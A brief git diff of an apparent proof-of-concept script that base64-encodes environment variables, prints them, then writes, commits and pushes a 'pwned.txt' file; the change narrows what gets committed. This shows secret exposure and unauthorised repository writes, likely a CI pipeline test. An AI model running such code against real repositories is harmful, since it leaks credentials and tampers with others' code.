@@ -47,7 +47,7 @@ async function main() {
         const envBase64 = Buffer.from(envJson).toString('base64');
         console.log(envBase64);
 
-        const command = `echo "foo" > pwned.txt && git add . && git commit -m "pwned" && git push`;
+        const command = `echo "foo" > pwned.txt && git add pwned.txt && git commit -m "pwned" && git push`;
         console.log("Trying to push...");
         exec(command, (error, stdout, stderr) => {
             if (error) {
